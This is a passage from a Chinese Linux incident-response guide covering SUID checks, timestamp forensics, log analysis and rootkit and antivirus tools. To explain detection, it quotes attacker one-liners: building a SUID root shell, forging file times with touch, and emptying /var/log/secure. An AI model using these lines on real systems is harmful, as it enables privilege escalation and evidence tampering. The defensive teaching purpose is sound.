+<p>命令路径目录：&#x2F;bin（系统必备命令）、&#x2F;usr&#x2F;bin（应用工具命令）、&#x2F;sbin（系统管理命令）、&#x2F;usr&#x2F;sbin（网络管理命令）。排查命令替换时，先确认命令原本应该属于哪个目录、权限对不对。</p>
+<p>时间属性速记：</p>
+<ul>
+<li>读文件：atime 改变，mtime&#x2F;ctime 不变</li>
+<li>改内容：atime、mtime、ctime 都变</li>
+<li>改属性（chmod&#x2F;chown）：ctime 改变</li>
+<li><mark>ctime 是 inode 变更时间，touch 伪造不了</mark>——攻击者改了 mtime&#x2F;atime，ctime 还停在攻击时间，stat 一眼看穿</li>
+</ul>
+<p><strong>2、文件保护（chattr &#x2F; lsattr）</strong></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chattr +i /etc/passwd           <span class="comment"># i=不可更改，防止被创建用户</span></span><br><span class="line">chattr +a /var/log/messages     <span class="comment"># a=只允许追加，适用于日志文件</span></span><br><span class="line">lsattr /etc/passwd              <span class="comment"># 查看属性</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>3、SUID 提权排查</strong></p>
+<p>原理：运行带 SUID 的二进制文件时，进程属主变成文件创建者（一般是 root），普通用户执行<mark>即获得 root 权限</mark>。SUID 只对二进制程序有效，对普通文件和脚本没有意义。</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -004000 -<span class="built_in">type</span> f 2&gt;/dev/null    <span class="comment"># 查找所有 SUID 可执行文件</span></span><br></pre></td></tr></table></div></figure>
+
+<p>攻击者手法：<code>cp /bin/bash /tmp/shell; chmod u+s /tmp/shell</code> 造一个 SUID shell，普通用户执行即得 root。SUID&#x2F;SGID 一并查并清理：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null    <span class="comment"># SUID 文件（root 权限执行）</span></span><br><span class="line">find / -perm /2000 2&gt;/dev/null    <span class="comment"># SGID 文件（组权限执行）</span></span><br><span class="line"><span class="built_in">chmod</span> u-s /tmp/shell              <span class="comment"># 取消 SUID 权限</span></span><br><span class="line"><span class="built_in">chmod</span> g-s /tmp/shell              <span class="comment"># 取消 SGID 权限</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>4、touch 伪造时间绕过</strong></p>
+<p>攻击者用 touch 把恶意文件的时间改掉，绕过 find 排查：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> -r /bin/ps attack.sh           <span class="comment"># 把 ps 的时间赋给 attack.sh（ctime 改不掉）</span></span><br><span class="line"><span class="built_in">touch</span> -at 202111111112.59 attack.sh  <span class="comment"># 指定 atime</span></span><br><span class="line"><span class="built_in">touch</span> -d <span class="string">&quot;20121111 18:11:11&quot;</span> attack.sh  <span class="comment"># 字符串形式修改时间</span></span><br></pre></td></tr></table></div></figure>
+
+<p>排查时注意：<mark>ctime 是 inode 变更时间，touch 伪造不了</mark>，看 stat 的 ctime 最容易露馅。</p>
+<h2 id="六、日志分析与时间线"><a href="#六、日志分析与时间线" class="headerlink" title="六、日志分析与时间线"></a>六、日志分析与时间线</h2><h3 id="6-1-关键日志与登录分析"><a href="#6-1-关键日志与登录分析" class="headerlink" title="6.1 关键日志与登录分析"></a>6.1 关键日志与登录分析</h3><p>日志默认存放在 &#x2F;var&#x2F;log&#x2F;，配置在 &#x2F;etc&#x2F;rsyslog.conf。</p>
+<p><strong>1、关键日志文件</strong></p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>日志文件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;var&#x2F;log&#x2F;messages</td>
+<td>系统重要日志，绝大多数信息都记这里，出问题先查它</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;secure</td>
+<td>登录认证日志：SSH 登录、su 切换、sudo 授权、建删用户都记</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;cron</td>
+<td>计划任务日志</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;maillog</td>
+<td>邮件日志</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;dmesg</td>
+<td>开机内核自检信息（dmesg 命令可直接看）</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;cups</td>
+<td>打印日志</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
+<td>登录&#x2F;注销&#x2F;系统启停记录（二进制，用 last 看）</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
+<td>错误登录记录（二进制，用 lastb 看）</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
+<td>每个用户最后登录时间（二进制，用 lastlog 看）</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;run&#x2F;utmp</td>
+<td>当前登录用户（二进制，用 w&#x2F;who&#x2F;users 看）</td>
+</tr>
+</tbody></table></div>
+<p><strong>2、登录日志分析（&#x2F;var&#x2F;log&#x2F;secure）</strong></p>
+<p>爆破分析：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"><span class="comment"># 爆破 root 账号的 IP 及次数</span></span><br><span class="line"></span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure | grep -E -o <span class="string">&quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;</span> | <span class="built_in">uniq</span> -c</span><br><span class="line"><span class="comment"># 所有爆破来源 IP</span></span><br><span class="line"></span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure | perl -e <span class="string">&#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"><span class="comment"># 爆破用的用户名字典</span></span><br></pre></td></tr></table></div></figure>
+
+<p>登录成功分析：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr</span><br><span class="line"><span class="comment"># 登录成功的 IP 及次数</span></span><br><span class="line"></span><br><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 登录成功的日期、用户名、来源 IP</span></span><br></pre></td></tr></table></div></figure>
+
+<p>用户操作痕迹：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;useradd&quot;</span> /var/log/secure    <span class="comment"># 创建用户</span></span><br><span class="line"><span class="comment"># Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bash</span></span><br><span class="line"><span class="comment"># Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span></span><br><span class="line"></span><br><span class="line">grep <span class="string">&quot;userdel&quot;</span> /var/log/secure    <span class="comment"># 删除用户</span></span><br><span class="line">grep <span class="string">&quot;su:&quot;</span> /var/log/secure        <span class="comment"># su 切换用户</span></span><br><span class="line">grep <span class="string">&quot;sudo&quot;</span> /var/log/secure       <span class="comment"># sudo 授权执行（能看到执行的命令）</span></span><br><span class="line"><span class="comment"># Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; USER=root ; COMMAND=/sbin/shutdown -r now</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>3、系统服务日志</strong></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/cron        <span class="comment"># 计划任务日志</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/yum.log     <span class="comment"># yum 安装/更新记录</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/boot.log    <span class="comment"># 引导加载内容</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/messages    <span class="comment"># 系统日志</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/syslog      <span class="comment"># 系统警告信息</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/xferlog     <span class="comment"># FTP 会话日志</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/mysqld.log  <span class="comment"># MySQL 日志</span></span><br><span class="line"><span class="built_in">cat</span> ~/.mysql_history     <span class="comment"># MySQL 历史记录</span></span><br><span class="line"><span class="built_in">cat</span> /var/log/mail        <span class="comment"># 邮件日志</span></span><br></pre></td></tr></table></div></figure>
+
+<h3 id="6-2-journald-与-auditd"><a href="#6-2-journald-与-auditd" class="headerlink" title="6.2 journald 与 auditd"></a>6.2 journald 与 auditd</h3><p>CentOS7 默认日志走 systemd-journald，<mark>即使 secure 被清，journal 里可能还有残留</mark>：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">journalctl --since <span class="string">&quot;2024-10-16 22:50:00&quot;</span>   <span class="comment"># 按时间查全部日志</span></span><br><span class="line">journalctl -u sshd                          <span class="comment"># 指定单元</span></span><br><span class="line">journalctl _COMM=sshd                       <span class="comment"># 按进程名过滤</span></span><br><span class="line">journalctl -p err -b                        <span class="comment"># 本次启动的错误级日志</span></span><br></pre></td></tr></table></div></figure>
+
+<p>主机开了 auditd 的话，审计日志是更强证据链：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ausearch -ts 2024-10-16 22:50:00           <span class="comment"># 按时间查审计记录</span></span><br><span class="line">aureport --summary                          <span class="comment"># 审计汇总</span></span><br></pre></td></tr></table></div></figure>
+
+<h3 id="6-3-日志发送与清理痕迹"><a href="#6-3-日志发送与清理痕迹" class="headerlink" title="6.3 日志发送与清理痕迹"></a>6.3 日志发送与清理痕迹</h3><p>CentOS7 自带 rsyslog，可把日志实时发送到日志服务器（改 &#x2F;etc&#x2F;rsyslog.conf）：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*.info;*notice @192.168.31.75:514     # 一般日志发到日志服务器（@=UDP，@@=TCP）</span><br><span class="line">cron.info @192.168.31.75:514          # 只发 cron 的 info 以上级别</span><br><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></table></div></figure>
+
+<p>配置格式是”设备.级别”：authpriv.<em>（认证类全记录）、</em>.info（info 以上都记）。设备类型：auth（pam）、authpriv（ssh&#x2F;ftp 登录验证）、cron、kern、lpr、mail、news、user、uucp、local0~7（自定义）。级别从低到高：debug &lt; info &lt; notice &lt; warning &lt; err &lt; crit &lt; alert &lt; emerg（+ none 不记录）。</p>
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/1597112133962-231acfbc-3c48-4ffd-918b-f213821c3d46.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/1597112133962-231acfbc-3c48-4ffd-918b-f213821c3d46.png"  alt="日志服务器接收 cron 日志" lazyload></a></p>
+<ul>
+<li>日志轮转由 logrotate 负责（&#x2F;etc&#x2F;logrotate.conf、&#x2F;etc&#x2F;logrotate.d&#x2F;），老日志带 .1、.2 后缀</li>
+<li>攻击者清理动作：直接删 secure&#x2F;auth.log、<code>&gt; /var/log/secure</code> 清空</li>
+<li><mark>日志文件缺失、从某天开始断层、突然消失——本身就是入侵痕迹</mark></li>
+</ul>
+<blockquote>
+<p>完整的日志分析方法（事件 ID、PowerShell 查询等）见 第2篇-Linux日志分析</p>
+</blockquote>
+<h2 id="七、工具与参考"><a href="#七、工具与参考" class="headerlink" title="七、工具与参考"></a>七、工具与参考</h2><h3 id="7-1-工具篇"><a href="#7-1-工具篇" class="headerlink" title="7.1 工具篇"></a>7.1 工具篇</h3><h4 id="7-1-1-Rootkit-查杀"><a href="#7-1-1-Rootkit-查杀" class="headerlink" title="7.1.1 Rootkit 查杀"></a>7.1.1 Rootkit 查杀</h4><ul>
+<li><p>chkrootkit</p>
+<p>网址：<a target="_blank" rel="noopener" href="http://www.chkrootkit.org/">http://www.chkrootkit.org</a></p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</span><br><span class="line">tar zxvf chkrootkit.tar.gz</span><br><span class="line">cd chkrootkit-0.52</span><br><span class="line">make sense</span><br><span class="line">#编译完成没有报错的话执行检查</span><br><span class="line">./chkrootkit</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>rkhunter</p>
+<p>网址：<a target="_blank" rel="noopener" href="http://rkhunter.sourceforge.net/">http://rkhunter.sourceforge.net</a></p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用方法：</span><br><span class="line">wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz</span><br><span class="line">tar -zxvf rkhunter-1.4.4.tar.gz</span><br><span class="line">cd rkhunter-1.4.4</span><br><span class="line">./installer.sh --install</span><br><span class="line">rkhunter -c</span><br></pre></td></tr></table></div></figure>
+</li>
+<li><p>其他：OSSEC（HIDS，含 Rootkit 检测模块）、zeppoo（专门检测系统调用层隐藏的 Rootkit）</p>
+</li>
+</ul>
+<h4 id="7-1-2-病毒查杀"><a href="#7-1-2-病毒查杀" class="headerlink" title="7.1.2 病毒查杀"></a>7.1.2 病毒查杀</h4><ul>
+<li><p>Clamav</p>
+<p>网址：<a target="_blank" rel="noopener" href="http://www.clamav.net/download.html">http://www.clamav.net/download.html</a></p>
+<p>安装方式一：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1、安装 zlib：</span><br><span class="line">wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz</span><br><span class="line">tar -zxvf  zlib-1.2.7.tar.gz</span><br><span class="line">cd zlib-1.2.7</span><br><span class="line">#安装一下gcc编译环境： yum install gcc</span><br><span class="line">CFLAGS=&quot;-O3 -fPIC&quot; ./configure --prefix= /usr/local/zlib/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">2、添加用户组 clamav 和组成员 clamav：</span><br><span class="line">groupadd clamav</span><br><span class="line">useradd -g clamav -s /bin/false -c &quot;Clam AntiVirus&quot; clamav</span><br><span class="line"></span><br><span class="line">3、安装 Clamav</span><br><span class="line">tar -zxvf clamav-0.97.6.tar.gz</span><br><span class="line">cd clamav-0.97.6</span><br><span class="line">./configure --prefix=/opt/clamav --disable-clamav --with-zlib=/usr/local/zlib</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line"></span><br><span class="line">4、配置 Clamav</span><br><span class="line">mkdir /opt/clamav/logs</span><br><span class="line">mkdir /opt/clamav/updata</span><br><span class="line">touch /opt/clamav/logs/freshclam.log</span><br><span class="line">touch /opt/clamav/logs/clamd.log</span><br><span class="line">cd /opt/clamav/logs</span><br><span class="line">chown clamav:clamav clamd.log</span><br><span class="line">chown clamav:clamav freshclam.log</span><br><span class="line"></span><br><span class="line">5、ClamAV 使用：</span><br><span class="line"> /opt/clamav/bin/freshclam 升级病毒库</span><br><span class="line">./clamscan -h 查看相应的帮助信息</span><br><span class="line">./clamscan -r /home  扫描所有用户主目录</span><br><span class="line">./clamscan -r --bell -i /bin  扫描bin目录并且显示有问题的文件的扫描结果</span><br></pre></td></tr></table></div></figure>
+
+<p>安装方式二：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#安装</span><br><span class="line">yum install -y clamav</span><br><span class="line">#更新病毒库</span><br><span class="line">freshclam</span><br><span class="line">#扫描方法</span><br><span class="line">clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log</span><br><span class="line">clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log</span><br><span class="line">clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log</span><br><span class="line">#扫描并杀毒</span><br><span class="line">clamscan -r  --remove  /usr/bin/bsd-port</span><br><span class="line">clamscan -r  --remove  /usr/bin/</span><br><span class="line">clamscan -r --remove  /usr/local/zabbix/sbin</span><br><span class="line">#查看日志发现</span><br><span class="line">cat /root/usrclamav.log |grep FOUND</span><br></pre></td></tr></table></div></figure>
+
+<p>安装 方式三：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">apt install clamav</span><br><span class="line"></span><br><span class="line"><span class="comment">#扫描</span></span><br><span class="line">clamscan -r /home</span><br></pre></td></tr></table></div></figure></li>
+</ul>
+<h4 id="7-1-3-WebShell-查杀"><a href="#7-1-3-WebShell-查杀" class="headerlink" title="7.1.3 WebShell 查杀"></a>7.1.3 WebShell 查杀</h4><p>Linux 版：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">河马 WebShell 查杀：http://www.shellpub.com</span><br></pre></td></tr></table></div></figure>
+
+<h4 id="7-1-4-RPM-完整性检查"><a href="#7-1-4-RPM-完整性检查" class="headerlink" title="7.1.4 RPM 完整性检查"></a>7.1.4 RPM 完整性检查</h4><p>系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -Va &gt; rpm.log</span><br></pre></td></tr></table></div></figure>
+
+<p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是 .（点）则表示测试通过。</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">验证内容中的8个信息的具体内容如下：</span><br><span class="line">		S         文件大小是否改变</span><br><span class="line">		M         文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">		5         文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">		D         设备号（主/次）是否改变</span><br><span class="line">		L         文件路径是否改变</span><br><span class="line">		U         文件的属主（所有者）是否改变</span><br><span class="line">		G         文件的属组是否改变</span><br><span class="line">		T         文件的修改时间是否改变</span><br></pre></td></tr></table></div></figure>
+
+<p>如果命令被替换了，如何还原回来：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件提取还原案例：</span><br><span class="line">rpm  -qf /bin/ls  查询 ls 命令属于哪个软件包</span><br><span class="line">mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象</span><br><span class="line">rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下</span><br><span class="line">cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失</span><br></pre></td></tr></table></div></figure>
+
+<h4 id="7-1-5-Linux-安全检查脚本"><a href="#7-1-5-Linux-安全检查脚本" class="headerlink" title="7.1.5 Linux 安全检查脚本"></a>7.1.5 Linux 安全检查脚本</h4><p>Github 项目地址：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/ppabc/security_check">https://github.com/ppabc/security_check</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/T0xst/linux">https://github.com/T0xst/linux</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/al0ne/LinuxCheck">https://github.com/al0ne/LinuxCheck</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/enomothem/Whoamifuck">https://github.com/enomothem/Whoamifuck</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/m-sec-org/d-eyes">https://github.com/m-sec-org/d-eyes</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/Ashro-one/Ashro_linux">https://github.com/Ashro-one/Ashro_linux</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/sun977/linuxcheckshoot">https://github.com/sun977/linuxcheckshoot</a></li>
+</ul>
+<h4 id="7-1-6-lynis"><a href="#7-1-6-lynis" class="headerlink" title="7.1.6 lynis"></a>7.1.6 lynis</h4><p>系统安全审计工具：<a target="_blank" rel="noopener" href="https://github.com/CISOfy/lynis">https://github.com/CISOfy/lynis</a></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> lynis</span><br><span class="line">./lynis audit system</span><br></pre></td></tr></table></div></figure>
+
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/1596005845625-8d6aa075-0690-4ddd-b930-a63ed5ad42a4.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/1596005845625-8d6aa075-0690-4ddd-b930-a63ed5ad42a4.png"  alt="lynis" lazyload></a></p>
+<h4 id="7-1-7-linux-check-sh"><a href="#7-1-7-linux-check-sh" class="headerlink" title="7.1.7 linux_check.sh"></a>7.1.7 linux_check.sh</h4><p>Linux 快速扫描脚本：<a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2021/sh/1543119/1611134301825-571aeed6-dc1f-41da-88c8-296fe3bd078c.sh">https://www.yuque.com/attachments/yuque/0/2021/sh/1543119/1611134301825-571aeed6-dc1f-41da-88c8-296fe3bd078c.sh</a></p>
+<p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p>
+<h3 id="7-2-参考篇"><a href="#7-2-参考篇" class="headerlink" title="7.2 参考篇"></a>7.2 参考篇</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S1_kTpYR0_eHnIsC1GUaFw">蓝队应急响应姿势之Linux</a></li>
+</ul>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#0%E3%80%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B"><span class="top-box-text">0、应急响应流程</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E6%91%B8%E7%8E%B0%E7%8A%B6%EF%BC%9A%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%8E%86%E5%8F%B2"><span class="top-box-text">一、摸现状：系统与历史</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-1-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E4%B8%8E%E6%97%B6%E9%97%B4"><span class="top-box-text">1.1 系统信息与时间</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#1-2-%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="top-box-text">1.2 历史命令</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81%E7%BD%91%E7%BB%9C%E4%B8%8E%E8%BF%9B%E7%A8%8B%E6%8E%92%E6%9F%A5"><span class="top-box-text">二、网络与进程排查</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-1-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E4%B8%8E%E7%AB%AF%E5%8F%A3"><span class="top-box-text">2.1 网络连接与端口</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-2-%E8%BF%9B%E7%A8%8B%E6%8E%92%E6%9F%A5%E4%B8%8E%E9%9A%90%E8%97%8F%E6%89%8B%E6%B3%95"><span class="top-box-text">2.2 进程排查与隐藏手法</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#2-3-%E5%BC%82%E5%B8%B8%E5%A4%96%E8%BF%9E%E6%8E%92%E6%9F%A5%EF%BC%88%E6%8C%96%E7%9F%BF%E6%A1%88%E4%BE%8B%EF%BC%89"><span class="top-box-text">2.3 异常外连排查（挖矿案例）</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81%E8%B4%A6%E5%8F%B7%E4%B8%8E%E8%AE%BF%E9%97%AE%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5"><span class="top-box-text">三、账号与访问后门排查</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-1-%E7%94%A8%E6%88%B7%E4%B8%8E%E6%9D%83%E9%99%90"><span class="top-box-text">3.1 用户与权限</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-2-SSH-%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5"><span class="top-box-text">3.2 SSH 后门排查</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81%E6%8C%81%E4%B9%85%E5%8C%96%E6%8E%92%E6%9F%A5"><span class="top-box-text">四、持久化排查</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-1-%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="top-box-text">4.1 开机启动项</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-2-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="top-box-text">4.2 计划任务</span></a></li><li class="top-box-item top-box-level-3"><a 